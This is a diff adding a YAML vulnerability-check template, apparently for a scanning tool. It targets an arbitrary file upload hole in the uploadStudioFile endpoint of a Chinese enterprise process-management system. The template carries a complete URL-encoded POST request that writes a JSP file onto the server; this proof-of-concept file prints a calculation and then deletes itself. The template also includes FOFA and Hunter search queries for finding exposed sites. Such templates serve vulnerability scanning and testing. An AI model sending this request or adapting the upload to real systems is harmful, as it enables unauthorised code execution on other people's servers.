@@ -1,0 +1,16 @@
+name: skzy-fileupload  #时空智友企业流程化管控系统
+rules: 
+  - method: POST  
+    path: /formservice?service=updater.uploadStudioFile
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: content=%3c%3fxml%20version%3d%221.0%22%3f%3e%3croot%3e%3cfilename%3etest.jsp%3c%2ffilename%3e%3cfilepath%3e.%2f%3c%2ffilepath%3e%3cfilesize%3e172%3c%2ffilesize%3e%3clmtime%3e1970-01-01%2008%3a00%3a00%3c%2flmtime%3e%3c%2froot%3e%3c!--%3c%25%20out.print(%22%3cpre%3e%22)%3bout.println(3233%20*%203323)%3bout.print(%22%3c%2fpre%3e%22)%3bnew%20java.io.File(application.getRealPath(request.getServletPath())).delete()%3b%0d%0a%25%3e%0d%0a--%3e
+    expression:                        
+      status_code:                 
+      response_header:              
+      response_body: 文件大小错误          #上传的文件在/update/temp/studio/test.jsp            
+detail:                          
+  description: "时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统uploadStudioFile接口存在任意文件上传漏洞，截止到2024.10.24部分网站存在该漏洞"
+  search:             
+    fofa: body="login.jsp?login=null"
+    鹰图: web.body="login.jsp?login=null"
